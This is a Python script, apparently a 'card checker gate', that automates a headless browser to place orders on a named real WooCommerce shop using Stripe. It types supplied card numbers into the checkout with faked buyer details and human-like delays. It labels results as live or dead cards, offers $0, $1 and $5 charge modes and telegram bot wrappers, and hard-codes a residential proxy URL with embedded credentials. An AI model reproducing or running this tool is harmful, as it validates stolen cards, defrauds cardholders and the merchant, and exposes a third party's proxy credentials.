"""
WooStripe Browser-Based Gate
Uses Playwright for full browser automation to bypass Stripe integration surface restrictions
Supports Auth ($0), $1 Charge, and $5 Charge modes
"""

import asyncio
import os
import re
from typing import Tuple
from faker import Faker
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

RESIDENTIAL_PROXY = os.environ.get('RESIDENTIAL_PROXY', 'http://user_pinta:1acNvmOToR6d-country-US-state-Colorado-city-Denver@residential.ip9.io:8000')

CHROMIUM_PATH = '/nix/store/qa9cnw4v5xkxyip6mb9kxqfq1z4x2dx1-chromium-138.0.7204.100/bin/chromium'

WOOSTRIPE_SITES = {
    'rochesterpet': {
        'url': 'https://rochesterpet.com',
        'shop_path': '/shop/',
        'checkout_path': '/checkout/',
        'add_to_cart_selector': '[data-product_id]',
        'stripe_card_frame': 'iframe[name^="__privateStripeFrame"]',
        'card_number_selector': 'input[name="cardnumber"]',
        'card_expiry_selector': 'input[name="exp-date"]',
        'card_cvc_selector': 'input[name="cvc"]',
        'place_order_selector': '#place_order',
        'billing_first': '#billing_first_name',
        'billing_last': '#billing_last_name',
        'billing_address': '#billing_address_1',
        'billing_city': '#billing_city',
        'billing_state': '#billing_state',
        'billing_zip': '#billing_postcode',
        'billing_phone': '#billing_phone',
        'billing_email': '#billing_email',
    }
}


async def _run_browser_check(
    card_num: str, 
    card_mon: str, 
    card_yer: str, 
    card_cvc: str,
    site_key: str = 'rochesterpet',
    mode: str = 'auth',
    amount: str = '0.00'
) -> Tuple[str, bool]:
    """
    Run browser-based WooStripe check using Playwright.
    
    Args:
        card_num, card_mon, card_yer, card_cvc: Card details
        site_key: Key for site config in WOOSTRIPE_SITES
        mode: 'auth' for $0 check, 'charge' for real charge
        amount: Amount to charge (for charge mode)
    
    Returns: (result_message, success_bool)
    """
    fake = Faker('en_US')
    site = WOOSTRIPE_SITES.get(site_key)
    
    if not site:
        return ("DECLINED - Site not configured", False)
    
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    expiry = f"{card_mon}/{card_yer}"
    
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = f"{first_name.lower()}.{last_name.lower()}{fake.random_int(100, 999)}@gmail.com"
    
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                executable_path=CHROMIUM_PATH,
                args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            )
            
            context = await browser.new_context(
                viewport={'width': 1280, 'height': 800},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )
            
            page = await context.new_page()
            page.set_default_timeout(30000)
            
            await page.goto(f"{site['url']}{site['shop_path']}", wait_until='domcontentloaded')
            
            add_to_cart_btn = page.locator(site['add_to_cart_selector']).first
            product_id = await add_to_cart_btn.get_attribute('data-product_id')
            
            if product_id:
                await page.evaluate(f'''
                    fetch("/?wc-ajax=add_to_cart", {{
                        method: "POST",
                        headers: {{"Content-Type": "application/x-www-form-urlencoded"}},
                        body: "product_id={product_id}&quantity=1"
                    }})
                ''')
                await page.wait_for_timeout(1000)
            
            await page.goto(f"{site['url']}{site['checkout_path']}", wait_until='domcontentloaded')
            await page.wait_for_timeout(2000)
            
            if await page.locator(site['billing_first']).count() > 0:
                await page.fill(site['billing_first'], first_name)
                await page.fill(site['billing_last'], last_name)
                await page.fill(site['billing_address'], fake.street_address())
                await page.fill(site['billing_city'], 'Rochester')
                
                state_select = page.locator(site['billing_state'])
                if await state_select.count() > 0:
                    try:
                        await state_select.select_option('NY')
                    except:
                        await page.fill(site['billing_state'], 'NY')
                
                await page.fill(site['billing_zip'], '14624')
                await page.fill(site['billing_phone'], '5855551234')
                await page.fill(site['billing_email'], email)
            
            await page.wait_for_timeout(2000)
            
            stripe_frame = page.frame_locator(site['stripe_card_frame']).first
            
            card_input = stripe_frame.locator(site['card_number_selector'])
            await card_input.wait_for(state='visible', timeout=10000)
            
            for digit in card_num:
                await card_input.type(digit, delay=50)
            
            await page.wait_for_timeout(500)
            
            expiry_input = stripe_frame.locator(site['card_expiry_selector'])
            await expiry_input.click()
            for char in expiry:
                await expiry_input.type(char, delay=50)
            
            await page.wait_for_timeout(500)
            
            cvc_input = stripe_frame.locator(site['card_cvc_selector'])
            await cvc_input.click()
            for digit in card_cvc:
                await cvc_input.type(digit, delay=50)
            
            await page.wait_for_timeout(1000)
            
            place_order_btn = page.locator(site['place_order_selector'])
            await place_order_btn.click()
            
            await page.wait_for_timeout(5000)
            
            page_content = await page.content()
            current_url = page.url
            
            await browser.close()
            
            return _parse_checkout_result(page_content, current_url, mode, amount)
    
    except PlaywrightTimeout as e:
        return (f"DECLINED - Timeout: {str(e)[:50]}", False)
    except Exception as e:
        return (f"ERROR - {str(e)[:80]}", False)


def _parse_checkout_result(html: str, url: str, mode: str, amount: str) -> Tuple[str, bool]:
    """Parse the checkout result page to determine approval status."""
    html_lower = html.lower()
    
    if 'order-received' in url or 'thank you' in html_lower or 'order received' in html_lower:
        if mode == 'auth':
            return ("APPROVED ✅ CVV Match - Auth Passed", True)
        else:
            return (f"APPROVED ✅ CVV Match - Charged ${amount}", True)
    
    error_patterns = {
        'insufficient_funds': ('CCN ✅', 'CVV Match - Insufficient Funds'),
        'insufficient funds': ('CCN ✅', 'CVV Match - Insufficient Funds'),
        'incorrect_cvc': ('CVV ❌', 'CVV Mismatch - Card Live'),
        'invalid_cvc': ('CVV ❌', 'CVV Mismatch - Card Live'),
        'security code': ('CVV ❌', 'CVV Mismatch - Card Live'),
        'card_declined': ('DECLINED ❌', 'Card Declined'),
        'generic_decline': ('DECLINED ❌', 'Generic Decline'),
        'do_not_honor': ('DECLINED ❌', 'Do Not Honor'),
        'expired_card': ('DECLINED ❌', 'Expired Card'),
        'expired': ('DECLINED ❌', 'Expired Card'),
        'lost_card': ('DECLINED ❌', 'Lost Card'),
        'stolen_card': ('DECLINED ❌', 'Stolen Card'),
        'fraudulent': ('DECLINED ❌', 'Suspected Fraud'),
        'pickup_card': ('DECLINED ❌', 'Pickup Card'),
        'invalid card': ('DECLINED ❌', 'Invalid Card'),
        'card number is invalid': ('DECLINED ❌', 'Invalid Card Number'),
        'processing_error': ('ERROR', 'Processing Error'),
        'try_again_later': ('ERROR', 'Try Again Later'),
    }
    
    for pattern, (status, message) in error_patterns.items():
        if pattern in html_lower:
            return (f"{status} {message}", True)
    
    error_match = re.search(r'error["\s:]+([^<"]+)', html_lower)
    if error_match:
        error_msg = error_match.group(1)[:50].strip()
        return (f"DECLINED ❌ {error_msg}", True)
    
    if 'declined' in html_lower or 'failed' in html_lower:
        return ("DECLINED ❌ Payment Failed", True)
    
    return ("DECLINED ❌ Unknown Result", True)


def woostripe_browser_auth(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy=None) -> Tuple[str, bool]:
    """WooStripe Browser Auth Gate ($0 authorization check)"""
    return asyncio.get_event_loop().run_until_complete(
        _run_browser_check(card_num, card_mon, card_yer, card_cvc, mode='auth', amount='0.00')
    )


def woostripe_browser_charge_1(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy=None) -> Tuple[str, bool]:
    """WooStripe Browser $1 Charge Gate"""
    return asyncio.get_event_loop().run_until_complete(
        _run_browser_check(card_num, card_mon, card_yer, card_cvc, mode='charge', amount='1.00')
    )


def woostripe_browser_charge_5(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy=None) -> Tuple[str, bool]:
    """WooStripe Browser $5 Charge Gate"""
    return asyncio.get_event_loop().run_until_complete(
        _run_browser_check(card_num, card_mon, card_yer, card_cvc, mode='charge', amount='5.00')
    )


async def woostripe_browser_auth_async(card_num: str, card_mon: str, card_yer: str, card_cvc: str) -> Tuple[str, bool]:
    """Async version for use with telegram bot"""
    return await _run_browser_check(card_num, card_mon, card_yer, card_cvc, mode='auth', amount='0.00')


async def woostripe_browser_charge_1_async(card_num: str, card_mon: str, card_yer: str, card_cvc: str) -> Tuple[str, bool]:
    """Async version for use with telegram bot"""
    return await _run_browser_check(card_num, card_mon, card_yer, card_cvc, mode='charge', amount='1.00')


async def woostripe_browser_charge_5_async(card_num: str, card_mon: str, card_yer: str, card_cvc: str) -> Tuple[str, bool]:
    """Async version for use with telegram bot"""
    return await _run_browser_check(card_num, card_mon, card_yer, card_cvc, mode='charge', amount='5.00')


if __name__ == "__main__":
    import sys
    
    test_card = sys.argv[1] if len(sys.argv) > 1 else "4000000000000002|12|26|123"
    parts = test_card.split("|")
    
    print(f"Testing card: {parts[0][:6]}...{parts[0][-4:]}")
    print("Mode: Auth\n")
    
    result, success = woostripe_browser_auth(parts[0], parts[1], parts[2], parts[3])
    print(f"Result: {result}")
    print(f"Success: {success}")
